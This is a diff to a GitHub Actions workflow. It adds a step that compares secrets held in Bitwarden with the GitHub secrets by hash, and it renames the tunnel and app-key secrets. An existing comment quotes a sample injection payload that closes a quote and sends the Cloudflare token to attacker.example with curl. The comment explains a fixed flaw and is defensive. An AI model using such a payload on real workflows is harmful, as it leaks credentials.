@@ -184,10 +184,44 @@ jobs:
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
 
+      - name: Fetch shadow secrets from Bitwarden
+        # SHADOW RUN: exports BWS_-prefixed copies that nothing consumes. The
+        # live secrets.* reads below are untouched until the cutover flips them.
+        uses: ./.github/actions/bws-secrets
+        with:
+          access-token: ${{ secrets.BWS_ACCESS_TOKEN }}
+          secrets: |
+            GITHUB_APP_PRIVATE_KEY > BWS_GITHUB_APP_PRIVATE_KEY
+            CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN > BWS_CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN
+            AWS_SES_ACCESS_KEY_ID_EU > BWS_AWS_SES_ACCESS_KEY_ID_EU
+            AWS_SES_SECRET_ACCESS_KEY_EU > BWS_AWS_SES_SECRET_ACCESS_KEY_EU
+
+      - name: Compare shadow secrets against GitHub
+        shell: bash
+        env:
+          SHADOW_NAMES: GITHUB_APP_PRIVATE_KEY CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN AWS_SES_ACCESS_KEY_ID_EU AWS_SES_SECRET_ACCESS_KEY_EU
+          GH_GITHUB_APP_PRIVATE_KEY: ${{ secrets.GITHUB_APP_PRIVATE_KEY }}
+          GH_CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN }}
+          GH_AWS_SES_ACCESS_KEY_ID_EU: ${{ secrets.AWS_SES_ACCESS_KEY_ID_EU }}
+          GH_AWS_SES_SECRET_ACCESS_KEY_EU: ${{ secrets.AWS_SES_SECRET_ACCESS_KEY_EU }}
+        run: |
+          rc=0; read -ra names <<<"$SHADOW_NAMES"
+          sha() { printf '%s' "${1-}" | { sha256sum 2>/dev/null || shasum -a 256; } | cut -d' ' -f1; }
+          for n in "${names[@]}"; do
+            gv="GH_$n"; bv="BWS_$n"
+            # An ABSENT GitHub secret and an EMPTY Bitwarden value both hash to
+            # e3b0c442..., so without this arm two nothings compare EQUAL and the
+            # shadow reports "match" having verified nothing -- the exact defect
+            # this whole run exists to catch. Empty on either side is a failure.
+            if [ -z "${!gv-}" ] || [ -z "${!bv-}" ]; then echo "shadow $n EMPTY (github=${!gv:+set}${!gv:-unset} bitwarden=${!bv:+set}${!bv:-unset}) -- nothing was compared"; rc=1
+            elif [ "$(sha "${!gv-}")" = "$(sha "${!bv-}")" ]; then echo "shadow $n match"; else echo "shadow $n MISMATCH"; rc=1; fi
+          done
+          exit "$rc"
+
       - name: Resolve tunnel mode
         id: mode
         env:
-          BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.BREAKPOINT_TUNNEL_TOKEN }}
+          CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN }}
           CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}
           BREAKPOINT_DEBUG_SHELL: ${{ inputs.debug-shell }}
           BREAKPOINT_DESKTOP: ${{ inputs.desktop }}
@@ -213,7 +247,7 @@ jobs:
         if: inputs.services != 'none'
         with:
           client-id: ${{ vars.APP_ID }}
-          private-key: ${{ secrets.APP_PRIVATE_KEY }}
+          private-key: ${{ secrets.GITHUB_APP_PRIVATE_KEY }}
           preset: readonly
           repositories: console,elite
 
@@ -264,15 +298,15 @@ jobs:
       # "$VAR". This is not style. `${{ ... }}` is substituted into the script
       # TEXT before bash parses it, so a free-text value can close the quote and
       # run as a sibling command -- and this step's environment holds
-      # BREAKPOINT_TUNNEL_TOKEN. `access-emails` is a `type: string` input, i.e.
+      # CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN. `access-emails` is a `type: string` input, i.e.
       # arbitrary operator-supplied text, so
-      #     foo"; curl attacker.example/$BREAKPOINT_TUNNEL_TOKEN; echo "
+      #     foo"; curl attacker.example/$CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN; echo "
       # would have exfiltrated the Cloudflare token. Through `env:` the value is
       # data to bash, never program text. Caught by review of f8478874.
       - name: Start tunnel
         id: tunnel
         env:
-          BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.BREAKPOINT_TUNNEL_TOKEN }}
+          CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN }}
           CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}
           GITHUB_RUN_ID: ${{ github.run_id }}
           GITHUB_ACTOR: ${{ github.actor }}
@@ -325,7 +359,7 @@ jobs:
       - name: Teardown
         if: always()
         env:
-          BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.BREAKPOINT_TUNNEL_TOKEN }}
+          CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.CLOUDFLARE_BREAKPOINT_TUNNEL_TOKEN }}
           CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}
           BP_LABEL: ${{ inputs.tunnel-label }}
           GITHUB_RUN_ID: ${{ github.run_id }}
